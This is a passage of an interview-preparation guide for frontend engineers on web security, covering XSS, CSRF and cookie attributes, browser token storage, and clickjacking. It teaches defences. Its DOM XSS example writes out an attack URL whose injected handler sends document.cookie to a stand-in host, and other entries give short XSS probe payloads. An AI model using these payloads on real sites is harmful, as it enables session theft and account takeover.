# Frontend Engineer — Web Security

## XSS: types, prevention and Content Security Policy
- id: fe-sec-01
- roles: frontend, fullstack
- round: SECURITY
- difficulty: medium
- levels:
- tags: security, XSS, CSP, sanitisation, DOMPurify, Trusted Types, React

### Prompt
What is cross-site scripting (XSS)? Explain the main types, how attackers exploit them, how frameworks like React help and where they don't, and how you would use Content Security Policy and other defences to protect a frontend application.

### Answer
#### What the interviewer is really testing
- A precise definition: **attacker-controlled data executed as code in your origin**, with the victim's session.
- Knowing the **three types**: stored, reflected and DOM-based, and where each one lives.
- Understanding that **output encoding by context** is the core defence, and that React escapes text but not everything.
- Knowing React's **escape hatches**: `dangerouslySetInnerHTML`, `href="javascript:..."`, refs with `innerHTML`, server-rendered state injection.
- **Defence in depth**: sanitisation (DOMPurify), a strict **CSP** with nonces, **Trusted Types**, HttpOnly cookies.

#### Key points
- **Impact:** script running in your origin can read the DOM, call your APIs with the user's cookies, read `localStorage` tokens, capture keystrokes, change what the user sees, and spread (worms). It's a full account takeover in most apps.
- **Types:**
  - **Stored:** malicious input is saved (a comment, a profile name) and served to other users. Most dangerous, because it hits everyone who views it.
  - **Reflected:** input from the request (a query parameter) is echoed into the response; the attacker sends a crafted link.
  - **DOM-based:** entirely client-side; JavaScript reads a source (`location.hash`, `postMessage` data, `document.referrer`) and writes it to a sink (`innerHTML`, `eval`, `document.write`, `setTimeout(string)`, `element.src = 'javascript:...'`). The server never sees the payload.
- **Core defence: treat data as data.** Encode for the context it's placed in: HTML body, HTML attribute, URL, JavaScript, CSS each need different escaping.
- **What React does for you:** JSX text and attribute values are escaped, so `<div>{userName}</div>` is safe even if the name is `<img src=x onerror=alert(1)>`.
- **Where React doesn't protect you:**
  - `dangerouslySetInnerHTML={{ __html: userHtml }}`.
  - **URLs**: `<a href={userUrl}>` with `javascript:alert(1)`. React warns about `javascript:` URLs but historically still rendered them; validate the scheme (`https:`, `mailto:`) yourself.
  - Direct DOM APIs via refs: `ref.current.innerHTML = ...`, `insertAdjacentHTML`.
  - **SSR state injection**: `<script>window.__STATE__ = ${JSON.stringify(state)}</script>` breaks out with `</script>` in data; serialise with escaping (`serialize-javascript` or escape `<` as `<`).
  - Markdown renderers that allow raw HTML, third-party widgets, `eval`/`new Function`.
- **Sanitise when you must render HTML:** **DOMPurify** (with an allowlist), or render Markdown to safe React elements without raw HTML.
- **Content Security Policy:** an HTTP header telling the browser which scripts may run. A **strict CSP** uses nonces or hashes:
  `Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'`
  It blocks inline scripts and event handlers without the nonce, so most injected payloads fail even if the bug exists. Roll out with `Content-Security-Policy-Report-Only` first.
- **Trusted Types** (`require-trusted-types-for 'script'`): the browser rejects plain strings passed to dangerous sinks like `innerHTML`; only values created by an approved policy are allowed. Turns DOM XSS into a type error.
- **Limit the blast radius:** HttpOnly cookies (script can't read the session), short-lived tokens, and not storing secrets in `localStorage`.

#### Model answer
"Cross-site scripting is when an attacker gets their data interpreted as code in your origin. Once their script runs in your page, it runs as the user: it can call your APIs with the user's cookies, read anything in the DOM or localStorage, and change what the user sees. In practice that's account takeover.

There are three types. Stored XSS is where a payload is saved, say in a comment or display name, and served to everyone who views it. Reflected XSS is where a value from the URL is echoed into the page, and the attacker gets someone to click a crafted link. DOM-based XSS happens entirely in the browser: our own JavaScript takes something like `location.hash` or a `postMessage` payload and writes it into a dangerous sink like `innerHTML`. The server never sees it, so server-side filters don't help.

The core defence is to always treat data as data, encoded for the context it ends up in. React does a lot of this for us: anything in JSX curly braces is escaped, so a name containing an image tag with an onerror handler is just displayed as text. But React has gaps I watch for in code review. `dangerouslySetInnerHTML` is the obvious one. If we really need user HTML, like rich-text comments, it goes through DOMPurify with a tight allowlist first. The less obvious one is URLs: `<a href={profile.website}>` is exploitable with a `javascript:` URL, so we parse URLs and allow only `https:` and `mailto:`. Others are refs that set `innerHTML`, and server-rendered state injected into a script tag without escaping `</script>`.

Then I add defence in depth, assuming a bug will slip through somewhere. The big one is a strict Content Security Policy with per-request nonces and `strict-dynamic`. With that, an injected inline script or `onerror` attribute simply doesn't execute, because it doesn't have the nonce. I'd roll it out in report-only mode first, collect violations, fix them, and then enforce. On top of that, Trusted Types makes the browser refuse plain strings in sinks like `innerHTML`, which shuts down most DOM XSS. And session cookies are HttpOnly, so even a successful XSS can't steal the session token itself, although it can still act as the user while the page is open."

#### Another worked example
**A DOM XSS in a "share" feature.**
```js
// Vulnerable: shows "Shared by <name>" from the URL hash
const name = decodeURIComponent(location.hash.slice(1));
banner.innerHTML = 'Shared by ' + name;
// Attack: https://app.example.com/#<img src=x onerror="fetch('//evil.io?c='+document.cookie)">
```
Fixes, from best to acceptable:
1. Use `banner.textContent = 'Shared by ' + name;` (text, not HTML), or render with React.
2. Validate the input against an expected format (for example, `/^[\w .'-]{1,50}$/`).
3. With Trusted Types enforced, the original `innerHTML` line throws instead of executing.
4. With a strict CSP, the inline `onerror` handler is blocked even if the line remains.

#### A third worked example
**Safe rich text from a CMS or user comments.**
```tsx
import DOMPurify from 'dompurify';

function Comment({ html }: { html: string }) {
  const clean = useMemo(
    () => DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'code'],
      ALLOWED_ATTR: ['href'],
    }),
    [html],
  );
  return <div className="comment" dangerouslySetInnerHTML={{ __html: clean }} />;
}
```
Also add a DOMPurify hook to force `rel="noopener noreferrer"` on links and drop non-https `href` values. Sanitise on output (in the browser, close to the sink), because sanitising on input is tied to one output context and older stored data may predate the rule.

#### Step-by-step framework
1. **Define it**: attacker data executed as code in your origin.
2. **Name the types**: stored, reflected, DOM-based, with a source-to-sink example.
3. **Core defence**: context-aware encoding; let the framework escape.
4. **Audit escape hatches**: `dangerouslySetInnerHTML`, URL attributes, refs, SSR state, Markdown, `eval`.
5. **Sanitise** where HTML is genuinely needed (DOMPurify, allowlists).
6. **Add a strict CSP** with nonces and `strict-dynamic`, starting in report-only mode.
7. **Enforce Trusted Types** to block DOM sinks.
8. **Limit damage**: HttpOnly cookies, no long-lived tokens in JS-readable storage, lint rules for dangerous APIs.

#### Strong versus weak answer
| Weak | Strong |
|---|---|
| "React prevents XSS" | "React escapes text; I watch `dangerouslySetInnerHTML`, URLs, refs and SSR state" |
| Escapes `<` and `>` everywhere | Encodes for the specific context: HTML, attribute, URL, JS |
| Regex-based HTML stripping | DOMPurify with an allowlist |
| CSP with `'unsafe-inline'` | Nonce-based strict CSP, rolled out via report-only |
| Doesn't know DOM XSS | Explains sources and sinks, and Trusted Types |

#### Useful phrases
- "React escapes text, not intent: the escape hatches are where XSS lives."
- "Sources to sinks: where does untrusted data come in, and where could it run?"
- "CSP is the seatbelt; correct encoding is the brakes."
- "Assume one bug gets through, and make sure it can't run or can't do much."

#### Common pitfalls
- A CSP with **`'unsafe-inline'`** or broad hosts like `https://*.cdn.com`, which attackers can bypass (JSONP endpoints, hosted libraries).
- Thinking **input validation alone** is enough; data reaches many output contexts.
- Allowing **`javascript:` and `data:` URLs** in user-provided links.
- Injecting server state with plain `JSON.stringify` inside a script tag.
- Rolling your own sanitiser with regexes; browsers' parsing quirks will beat it (mutation XSS).
- Forgetting **third-party scripts**: an analytics tag running in your origin has the same power as an XSS.

#### Follow-ups to expect (with sample answers)
- **"Why nonces rather than an allowlist of domains?"** — "Domain allowlists are often bypassable, because any allowed domain that hosts a JSONP endpoint or an old Angular version can be abused. A nonce is unpredictable per response, so only scripts we put on the page run. `strict-dynamic` then lets those trusted scripts load their own dependencies."
- **"Does HttpOnly stop XSS?"** — "No. It stops the script from reading the cookie, which prevents session theft for later use. The script can still make authenticated requests while the page is open, so it limits the damage rather than preventing the attack."
- **"How do you add CSP to a Next.js app?"** — "Generate a nonce per request in middleware, set the header, and pass the nonce to scripts. That forces dynamic rendering, so it's a trade-off with static caching; hashes can work for static pages."
- **"What's mutation XSS?"** — "Markup that looks safe to a sanitiser but turns dangerous after the browser re-parses it, for example through nested `noscript` or SVG namespaces. It's why you use a maintained sanitiser like DOMPurify that parses with the browser's own parser."
- **"How do you find XSS in a codebase?"** — "Grep for sinks (`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `href={`), enable ESLint rules like `react/no-danger`, add CSP reporting to see violations in production, and include it in security reviews and pen tests."

#### What senior interviewers look for
- **Layered thinking**: prevention, then containment, then detection.
- Concrete knowledge of **framework gaps**, not blind trust in React.
- A **realistic CSP rollout plan** with reporting and gradual enforcement.
- Team-level guardrails: lint rules, code review checklists, a single sanctioned way to render HTML.

#### Practise it
- Find every use of `dangerouslySetInnerHTML` and user-provided `href` in a project and assess each one.
- Add a report-only CSP to a small app, read the violation reports, and tighten it until it can be enforced.
- Explain stored vs reflected vs DOM-based XSS in 45 seconds, with one example each.

#### Variations you might be asked
- "Is it safe to render Markdown from users?"
- "How does CSP work, and what would you put in yours?"
- "A user's display name broke your page layout. What else might be wrong?"

## CSRF, cookies and SameSite
- id: fe-sec-02
- roles: frontend, fullstack
- round: SECURITY
- difficulty: medium
- levels:
- tags: security, CSRF, cookies, SameSite, CORS, tokens

### Prompt
What is cross-site request forgery (CSRF)? Explain how it works, how cookie attributes like `SameSite`, `Secure` and `HttpOnly` affect it, how it differs from CORS, and which defences you would use for a modern single-page app.

### Answer
#### What the interviewer is really testing
- Understanding that CSRF exploits **ambient credentials**: the browser automatically attaches cookies to requests to a site, even when another site triggers them.
- Knowing the **cookie attributes** precisely: `SameSite=Strict/Lax/None`, `Secure`, `HttpOnly`, `Domain`, `Path`, and the `__Host-` prefix.
- Separating **CORS from CSRF**: CORS controls whether a page can *read* a cross-origin response, not whether the request is *sent*.
- Knowing the defences: SameSite, **CSRF tokens** (synchroniser or double-submit), **Origin/Fetch Metadata checks**, and requiring custom headers.
- Understanding the **"site" vs "origin"** distinction and why it matters for subdomains.

#### Key points
- **How CSRF works:** you're logged in to `bank.com` with a session cookie. You visit `evil.com`, which contains `<form action="https://bank.com/transfer" method="POST">` auto-submitted by script. The browser sends the request **with your bank cookie**, and the bank sees a valid authenticated request. The attacker can't read the response, but the action already happened.
- **Requirements for CSRF:** cookie-based (or other ambient) authentication, a state-changing endpoint, and request parameters the attacker can predict.
- **Cookie attributes:**
  - `HttpOnly`: JavaScript can't read the cookie. Defends against XSS stealing it; **does nothing for CSRF**.
  - `Secure`: only sent over HTTPS.
  - `SameSite=Strict`: never sent on cross-site requests, even top-level navigation (clicking a link to your site from email arrives logged out).
  - `SameSite=Lax`: sent on top-level GET navigations, not on cross-site POSTs, iframes, images or fetches. **Chrome's default** when unspecified (with a short grace period for POST after the cookie is set).
  - `SameSite=None; Secure`: sent everywhere; needed for genuine third-party contexts (embedded widgets), and increasingly blocked by third-party cookie restrictions.
  - `__Host-` prefix: requires `Secure`, `Path=/`, and no `Domain`, so a subdomain can't overwrite it.
- **Site vs origin:** `SameSite` is about the **registrable domain** (eTLD+1). `app.example.com` and `evil.example.com` are **same-site**, so SameSite doesn't protect you from a compromised or user-controlled subdomain.
- **CORS is not a CSRF defence:** a "simple" cross-origin request (form POST, `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) is sent without a preflight; CORS only stops the attacker reading the response. A misconfigured CORS policy (reflecting any origin with credentials) actually makes things worse.
- **Defences, layered:**
  1. **`SameSite=Lax` or `Strict`** session cookies.
  2. **Never change state on GET** (Lax still sends cookies on top-level GETs).
  3. **CSRF tokens**: a random per-session value the server checks on every state-changing request. Synchroniser token (stored server-side) or signed double-submit cookie (cookie value must match a header).
  4. **Check `Origin`** (and `Sec-Fetch-Site`, a Fetch Metadata header) on the server; reject cross-site state-changing requests.
  5. **Require a custom header or JSON content type**: these trigger a CORS preflight, which a cross-origin attacker can't pass if CORS is strict.
- **Token-in-header auth** (`Authorization: Bearer ...` from JS) isn't vulnerable to classic CSRF because the browser doesn't attach it automatically, but the token then lives in JavaScript-readable storage, which raises XSS risk.

#### Model answer
"CSRF is an attack where another site makes the user's browser send a request to our site, and the browser helpfully attaches the user's cookies. If you're logged in to our app and visit a malicious page, that page can auto-submit a hidden form to our `/account/email` endpoint, and our server sees a perfectly authenticated request. The attacker can't read the response, but they don't need to: the email has already been changed, and they can now reset the password.

So CSRF needs three things: authentication the browser sends automatically, like cookies; an endpoint that changes state; and parameters the attacker can predict.

Cookie attributes are the first line of defence. `SameSite=Lax`, which Chrome now applies by default, means the cookie isn't sent on cross-site POSTs, fetches or iframes, only on top-level GET navigations. That kills the classic hidden-form attack, as long as we never change state on a GET. `Strict` is stronger but means following a link to us from an email arrives logged out, so I'd use it for particularly sensitive cookies. `HttpOnly` and `Secure` are important too, but `HttpOnly` is an XSS defence, it does nothing for CSRF.

I don't rely on SameSite alone, for two reasons. It's site-based, not origin-based, so any subdomain we host, maybe a marketing site or user-generated content on a subdomain, counts as same-site. And older browsers and some embedded contexts behave differently. So I add a server-side check: for state-changing requests, verify the `Origin` header, or the `Sec-Fetch-Site` header, matches our own origin. And for apps that use cookie sessions, a CSRF token: the server issues a random token, the SPA sends it in an `X-CSRF-Token` header, and the server checks it. A custom header also forces a CORS preflight, which a malicious origin can't pass if our CORS policy only allows our own origins with credentials.

A common confusion is thinking CORS prevents CSRF. It doesn't: CORS decides whether a script can read the response, but simple requests like form posts are sent regardless. A misconfigured CORS that reflects any origin with credentials actually opens a much worse hole, because then the attacker can read the responses too."

#### Another worked example
**Defending a cookie-session SPA with a double-submit token.**
```ts
// Server, on login: set two cookies
// Set-Cookie: __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/
// Set-Cookie: __Host-csrf=<random, HMAC-signed with session>; Secure; SameSite=Lax; Path=/

// Client: a fetch wrapper that copies the readable CSRF cookie into a header
export function api(path: string, init: RequestInit = {}) {
  const csrf = document.cookie.match(/(?:^|; )__Host-csrf=([^;]+)/)?.[1] ?? '';
  return fetch(path, {
    ...init,
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, ...init.headers },
  });
}
// Server middleware: for POST/PUT/PATCH/DELETE, require header === cookie
// and a valid signature tied to the session; also reject Sec-Fetch-Site: cross-site.
```
An attacker's page can make the browser send both cookies, but it can't read the CSRF cookie to put it in the header. Signing the token with the session stops "cookie tossing" from a sibling subdomain.

#### A third worked example
**Login CSRF and GET side effects.** Two less obvious variants:
- **Login CSRF:** the attacker logs *you* into *their* account (by posting their credentials to your login form). You then save a card or search history into an account they control. Defend the login endpoint with a CSRF token or Origin check too.
- **GET with side effects:** `<img src="https://app.com/api/unsubscribe?all=true">` in an email or forum post. `SameSite=Lax` sends cookies on top-level navigation, and some apps also accept GET for "convenience". Rule: GET, HEAD and OPTIONS must be safe and never change data.

#### Step-by-step framework
1. **Explain the mechanism**: ambient cookies sent on cross-site requests.
2. **State the conditions**: automatic credentials, state change, predictable parameters.
3. **Set cookie attributes**: `Secure`, `HttpOnly`, `SameSite=Lax` (or `Strict`), `__Host-` prefix.
4. **Keep GET safe**: no state changes on safe methods.
5. **Verify origin on the server**: `Origin` and `Sec-Fetch-Site` for unsafe methods.
6. **Add CSRF tokens** for cookie-authenticated apps, sent in a custom header.
7. **Lock down CORS**: explicit origin allowlist, credentials only for your own origins.
8. **Cover edge cases**: login CSRF, subdomains, embedded or third-party contexts that need `SameSite=None`.

#### Strong versus weak answer
| Weak | Strong |
|---|---|
| "HttpOnly prevents CSRF" | HttpOnly is for XSS; SameSite, tokens and Origin checks are for CSRF |
| "CORS blocks it" | CORS controls reading responses; simple requests are still sent |
| SameSite alone | SameSite plus Origin/Fetch Metadata checks plus tokens |
| Treats subdomains as safe | Knows SameSite is site-based; uses `__Host-` and signed tokens |
| State changes via GET links | Safe methods never change state |

#### Useful phrases
- "CSRF abuses the browser's habit of attaching cookies; it rides the user's session, it doesn't steal it."
- "CORS protects the response, not the request."
- "SameSite is site-based, so I don't trust it across subdomains."
- "HttpOnly is about XSS; it does nothing for CSRF."

#### Common pitfalls
- **CORS reflecting the request `Origin` with `Access-Control-Allow-Credentials: true`**, letting any site read authenticated responses.
- Assuming **JSON APIs are immune**: if the server accepts `text/plain` or form-encoded bodies and parses them as JSON, a form can still forge the request.
- **CSRF tokens in URLs**, which leak via logs and the `Referer` header.
- Setting **`SameSite=None`** everywhere to "fix" a broken embed.
- Forgetting **logout and login endpoints**.
- Exempting "internal" endpoints from CSRF middleware.

#### Follow-ups to expect (with sample answers)
- **"If we use JWTs in the Authorization header, do we need CSRF protection?"** — "Not for classic CSRF, because the browser doesn't attach that header by itself. But the token then has to be readable by JavaScript, so an XSS can steal it. That's the trade-off between cookie and header auth."
- **"Why does `SameSite=Lax` still allow some cross-site requests?"** — "To keep normal links working: when someone clicks a link to your site, a top-level GET navigation, they should arrive logged in. That's why GET must never change state."
- **"What is `Sec-Fetch-Site`?"** — "A Fetch Metadata header the browser adds, with values like `same-origin`, `same-site`, `cross-site` and `none`. The server can reject unsafe requests that are `cross-site`, which is a simple, strong check called a resource isolation policy."
- **"What's the difference between same-site and same-origin?"** — "Same-origin means scheme, host and port all match. Same-site means the same registrable domain, like `example.com`, so `a.example.com` and `b.example.com` are same-site but cross-origin."
- **"How do third-party cookie restrictions affect this?"** — "Browsers increasingly block cookies in third-party contexts, which reduces CSRF risk but breaks embedded widgets that rely on them. Options include CHIPS (`Partitioned` cookies) or the Storage Access API."

#### What senior interviewers look for
- **Precise mental model** of when the browser sends cookies.
- Not confusing **CORS, CSRF and XSS** defences.
- **Layered defence** and awareness of subdomain and legacy edge cases.
- Ability to make **trade-offs** between cookie-based and token-based auth.

#### Practise it
- Build a tiny form-post CSRF demo against a local app with `SameSite=None`, then fix it three ways (SameSite, token, Origin check).
- Audit an app's cookies in DevTools: list each cookie's attributes and justify them.
- Checklist: SameSite set · Secure and HttpOnly · safe GETs · Origin/Fetch Metadata check · CSRF token · strict CORS · login CSRF covered.

#### Variations you might be asked
- "Explain the difference between XSS and CSRF."
- "How does CORS work, and what does a preflight do?"
- "Our widget is embedded on customers' sites and needs to stay logged in. How do you handle cookies?"

## Where to store auth tokens in the browser
- id: fe-sec-03
- roles: frontend, fullstack
- round: SECURITY
- difficulty: medium
- levels:
- tags: security, authentication, JWT, cookies, localStorage, refresh tokens, BFF

### Prompt
A single-page app needs to authenticate users against an API. Where should it store access and refresh tokens: `localStorage`, `sessionStorage`, memory or cookies? Explain the security trade-offs of each, and describe the approach you would recommend.

### Answer
#### What the interviewer is really testing
- Understanding the **two main threats**: XSS (script reads or uses tokens) and CSRF (browser sends credentials automatically).
- Knowing that **no storage is safe from XSS**: the question is whether a token can be *stolen and used later*, or only *used while the page is open*.
- Knowledge of **access vs refresh tokens**, short lifetimes, **refresh token rotation** and reuse detection.
- Awareness of the **Backend-for-Frontend (BFF)** pattern recommended by current OAuth guidance for browser apps.
- Practical concerns: multiple tabs, page reloads, logout, cross-domain APIs, mobile Safari quirks.

#### Key points
- **`localStorage`:**
  - Persists across reloads and tabs; simple.
  - **Readable by any script in the origin**, so one XSS (or a compromised npm package or third-party script) can exfiltrate the token and use it from anywhere until it expires.
  - Not sent automatically, so no CSRF.
- **`sessionStorage`:** same XSS exposure, scoped to one tab, cleared when the tab closes. Breaks "open in new tab".
- **In memory (a JS variable or closure):**
  - Not persisted, harder to scrape than storage, but **still reachable by XSS** (the attacker can call your API client or hook `fetch`).
  - Lost on reload, so you need a way to get a new access token silently, usually a refresh token in an HttpOnly cookie.
- **HttpOnly, Secure, SameSite cookie:**
  - **JavaScript can't read it**, so XSS can't steal it for later use (it can still make requests while the user's page is open).
  - Sent automatically, so you need **CSRF defences** (SameSite, Origin check, CSRF token).
  - Works best when the API is **same-site** with the app; cross-site APIs run into third-party cookie blocking.
- **Token types:**
  - **Access token:** short-lived (5 to 15 minutes), sent with API calls.
  - **Refresh token:** long-lived, used only to get new access tokens; most valuable, so it needs the strongest protection. Use **rotation** (each use issues a new one) with **reuse detection** (if an old one is used again, revoke the whole family).
- **Recommended patterns, best first:**
  1. **BFF / session cookie:** a thin server on the same site handles OAuth, keeps tokens server-side, and gives the browser only an HttpOnly session cookie. The SPA never touches tokens. The current OAuth for browser-based apps guidance favours this.
  2. **Access token in memory + refresh token in HttpOnly cookie** scoped to the refresh endpoint (`Path=/auth/refresh`), with rotation. On load, call refresh to get an access token.
  3. **`localStorage`** only for low-risk apps, with very short-lived tokens and a strict CSP. Acceptable trade-off sometimes, but say so explicitly.
- **XSS is the real enemy:** whatever you choose, a strict CSP, careful dependency management and avoiding dangerous sinks matter more than the storage choice.

#### Model answer
"I'd start by naming the two threats, because each option trades one against the other. XSS is when attacker script runs in our page; CSRF is when another site makes the browser send our credentials automatically.

`localStorage` is the most common choice and the easiest, and it's immune to CSRF because nothing is sent automatically. But any script running in our origin can read it: an XSS bug, a compromised npm dependency, or a third-party analytics tag. The token can be copied to an attacker's server and used from anywhere until it expires. `sessionStorage` has the same problem, just scoped to a tab.

Keeping the access token only in memory is better: it isn't sitting in storage to be scraped, and it disappears on reload. It's not immune, though; a script running in the page can still use our API client. And on reload we need a way to get a new token.

An HttpOnly cookie can't be read by JavaScript at all. An XSS can still make requests while the victim has the page open, but it can't steal a credential and use it later, which significantly limits damage. The trade-off is that cookies are sent automatically, so we need CSRF defences: SameSite=Lax or Strict, an Origin check, and ideally a CSRF token.

So my recommendation, if we control the backend, is a Backend-for-Frontend. A small server on our domain does the OAuth flow, holds the access and refresh tokens server-side, and gives the browser a `__Host-` session cookie that's HttpOnly, Secure and SameSite. The SPA calls the BFF, the BFF attaches the access token and proxies to the APIs. The browser never holds a token. That's what current OAuth guidance for browser apps recommends.

If a BFF isn't possible, the next best is a short-lived access token in memory, with the refresh token in an HttpOnly cookie restricted to the refresh endpoint's path. On page load, the app calls `/auth/refresh` to get an access token. Refresh tokens rotate on every use, and if an old one is reused, the server revokes the session, because that means it was stolen.

And whichever we choose, the most important thing is still preventing XSS: a strict CSP, no dangerous HTML sinks, and care with third-party scripts. Storage choice limits the damage; it doesn't prevent the attack."

#### Another worked example
**In-memory access token with silent refresh:**
```ts
let accessToken: string | null = null;
let refreshing: Promise<string> | null = null;

async function refresh(): Promise<string> {
  // De-duplicate: many parallel 401s should trigger one refresh
  refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then(r => { if (!r.ok) throw new Error('logged out'); return r.json(); })
    .then(({ access_token }) => (accessToken = access_token))
    .finally(() => { refreshing = null; });
  return refreshing;
}

export async function api(path: string, init: RequestInit = {}) {
  const token = accessToken ?? (await refresh());
  const send = (t: string) =>
    fetch(path, { ...init, headers: { ...init.headers, Authorization: 'Bearer ' + t } });
  let res = await send(token);
  if (res.status === 401) res = await send(await refresh());
  return res;
}
```
The refresh cookie is `HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh`, so it's only ever sent to that endpoint. Sharing one in-flight `refreshing` promise prevents a burst of parallel requests from triggering several refreshes, which would trip refresh-token reuse detection. Use a `BroadcastChannel` to tell other tabs about logout.

#### A third worked example
**A B2B dashboard calling APIs on another domain.** The app is on `app.acme.com` and the API on `api.vendor.io`. Cookies for `api.vendor.io` are third-party cookies from the app's point of view, and Safari and Firefox block them (Chrome increasingly restricts them too), so "put the refresh token in a cookie" breaks on Safari. Options:
- Put the API behind your own domain (`app.acme.com/api` proxied, or `api.acme.com`), so cookies are first-party and same-site.
- Use a BFF on `app.acme.com` that holds tokens and proxies.
- As a last resort, tokens in memory with refresh tokens rotated and bound to the client (DPoP: proof-of-possession, so a stolen token is useless without the private key, kept as a non-extractable WebCrypto key).

#### Step-by-step framework
1. **Name the threats**: XSS (theft or misuse) and CSRF (automatic sending).
2. **Compare options** across XSS exposure, CSRF exposure, persistence and complexity.
3. **Separate token types**: short-lived access, long-lived refresh, and protect refresh most.
4. **Recommend the BFF** when you control the backend.
5. **Fallback**: access token in memory, refresh in a path-scoped HttpOnly cookie, with rotation and reuse detection.
6. **Add CSRF defences** wherever cookies are used.
7. **Prevent XSS** regardless: CSP, sanitisation, dependency hygiene.
8. **Handle UX details**: reload, multiple tabs, logout everywhere, Safari's cookie restrictions.

#### Strong versus weak answer
| Weak | Strong |
|---|---|
| "Use localStorage, it's standard" | Explains XSS exfiltration risk and when it's an acceptable trade-off |
| "Cookies are insecure because of CSRF" | Cookies plus SameSite and CSRF checks; HttpOnly limits XSS damage |
| "Memory storage is XSS-proof" | Memory reduces theft but XSS can still use the session |
| One long-lived token | Short access tokens, rotating refresh tokens with reuse detection |
| Never heard of a BFF | Recommends a BFF and explains why tokens never reach the browser |

#### Useful phrases
- "No browser storage survives XSS; the question is whether the token can be stolen and used later."
- "The refresh token is the crown jewel, so it never touches JavaScript."
- "Cookies trade XSS exposure for CSRF exposure, and CSRF is the easier one to defend."
- "The best token for the browser is no token: a BFF and a session cookie."

#### Common pitfalls
- **Long-lived access tokens** (days) in `localStorage`.
- Storing **refresh tokens in `localStorage`**, giving attackers persistent access.
- Using cookies **without CSRF protection**.
- Parallel 401s each triggering a **refresh race**, which breaks rotation.
- **Logout that only clears client state**, without revoking the refresh token on the server.
- Putting tokens in **URLs** (implicit flow), where they leak via history, logs and `Referer`. Use the authorization code flow with PKCE instead.

#### Follow-ups to expect (with sample answers)
- **"Why is the OAuth implicit flow discouraged?"** — "It returned access tokens in the URL fragment, exposed to browser history, extensions and referrers, with no refresh tokens. Authorization code flow with PKCE is now the standard for SPAs."
- **"How do you log out across all tabs?"** — "Revoke the session server-side, clear the cookie, and post a message on a `BroadcastChannel` (or listen for a `storage` event) so other tabs clear their in-memory token and redirect."
- **"What if the user has the app open for hours?"** — "Refresh proactively shortly before expiry, or on the first 401. Rotation keeps each refresh token single-use, and an absolute session lifetime forces a full re-login eventually."
- **"Can a Service Worker hold the token?"** — "It can keep tokens out of the main thread and attach them to requests, which reduces exposure, but a script in the page can still send requests through it. It's a hardening step, not a fix for XSS."
- **"What does a BFF cost?"** — "Another service to deploy and scale, an extra network hop, and session storage on the server. For many apps the framework server (Next.js route handlers, Remix loaders) already plays this role."

#### What senior interviewers look for
- Framing the decision as a **threat-model trade-off**, not a rule.
- Knowing **current guidance** (BFF, PKCE, rotation, DPoP) rather than old blog-post advice.
- Attention to **operational details**: refresh races, multi-tab, revocation, Safari.
- Recognising that **XSS prevention** matters more than storage location.

#### Practise it
- Implement the in-memory access token plus refresh-cookie pattern, including de-duplicated refresh and cross-tab logout.
- Draw a sequence diagram of a BFF login with authorization code and PKCE.
- Checklist: threats named · options compared · refresh token protected · rotation and reuse detection · CSRF covered · XSS defences · logout revokes server-side.

#### Variations you might be asked
- "Is it safe to store a JWT in localStorage?"
- "How would you implement 'remember me' securely?"
- "What happens to your auth if the user's browser blocks third-party cookies?"

## Clickjacking, iframes and postMessage security
- id: fe-sec-04
- roles: frontend, fullstack
- round: SECURITY
- difficulty: medium
- levels:
- tags: security, clickjacking, iframes, postMessage, frame-ancestors, sandbox, COOP

### Prompt
What is clickjacking, and how do you prevent it? More broadly, how do you safely embed third-party content in iframes, allow your own app to be embedded, and communicate between windows with `postMessage`?

### Answer
#### What the interviewer is really testing
- Understanding **clickjacking**: your page loaded invisibly in an attacker's frame, with the user tricked into clicking it.
- Knowing the modern defence, **CSP `frame-ancestors`**, and the legacy **`X-Frame-Options`** header.
- Safe embedding of **untrusted content**: the `sandbox` attribute, `allow` (Permissions Policy), separate origins for user content.
- **`postMessage` security**: always check `event.origin`, never use `'*'` as the target for sensitive data, validate the message shape.
- Awareness of **cross-window attacks**: `window.opener` tabnabbing, and isolation headers like COOP.

#### Key points
- **Clickjacking (UI redressing):** `evil.com` loads `bank.com/settings` in an iframe with `opacity: 0`, positioned so that a "Win a prize!" button sits exactly over "Delete account" or "Allow camera". The user's click lands on your page, with their cookies (if SameSite allows the frame to send them).
- **Defences:**
  - `Content-Security-Policy: frame-ancestors 'none'` (never framed), `'self'`, or an explicit list (`frame-ancestors 'self' https://partner.com`).
  - `X-Frame-Options: DENY` or `SAMEORIGIN` for older browsers; `frame-ancestors` takes priority when both are set.
  - `SameSite=Lax/Strict` cookies mean a cross-site frame loads logged out, which also blunts the attack.
  - JavaScript frame-busting (`if (top !== self) top.location = self.location`) is unreliable; attackers can sandbox the frame to block it.
- **Embedding third-party or user content safely:**
  - `<iframe sandbox>` with no value blocks scripts, forms, popups, top navigation and same-origin access. Add only what's needed: `sandbox="allow-scripts allow-forms"`.
  - **Never combine `allow-scripts` and `allow-same-origin`** for same-origin content: the framed page can then remove its own sandbox.
  - Serve **user-generated content from a separate origin** (like `usercontent.example.net`) so it can't touch your cookies or DOM.
  - `allow="camera 'none'; geolocation 'none'"` restricts powerful features; `referrerpolicy` and `loading="lazy"` are useful too.
  - `credentialless` iframes (where supported) load without cookies.
- **`postMessage`:**
  - Sending: `otherWindow.postMessage(data, 'https://exact-origin.com')`. Using `'*'` means any page that's currently in that window (maybe after a redirect) receives the data.
  - Receiving: **check `event.origin` against an exact allowlist**, check `event.source` is the window you expect, and validate the payload's shape (with a schema). Treat the data as untrusted input; never pass it to `innerHTML` or `eval`.
  - Common bugs: `origin.includes('example.com')` (matches `example.com.evil.io`), `indexOf`, regexes without anchors.
- **Cross-window risks:**
  - **Reverse tabnabbing:** a link opened with `target="_blank"` could use `window.opener.location = phishingUrl`. Modern browsers imply `noopener` for `_blank`, but add `rel="noopener noreferrer"` for user links and `window.open(url, '_blank', 'noopener')`.
  - **`Cross-Origin-Opener-Policy: same-origin`** puts your page in its own browsing context group, so cross-origin popups can't reference it. Required (with COEP) for cross-origin isolation features like `SharedArrayBuffer`.

#### Model answer
